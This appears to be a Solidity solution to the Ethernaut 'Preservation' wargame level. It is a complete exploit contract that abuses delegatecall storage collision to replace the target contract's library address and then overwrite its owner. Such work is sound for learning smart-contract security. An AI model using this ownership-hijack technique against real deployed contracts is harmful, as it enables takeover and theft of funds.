// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel16.sol";

contract DelegateHack {

    address public t1;
    address public t2;
    address public owner;
    Preservation level16 = Preservation(0x7709b4AA6aC44EEC15201a90d3C8E484618F2cD3);      

    function exploit() external {
        level16.setFirstTime(uint256(address(this)));
        level16.setFirstTime(uint256(0xE94eE0D98415D86ddbA0df1e8b733B4A332D3fbD));
    }

    function setTime(uint256 _owner) public {
        owner = address(_owner);
    }

}

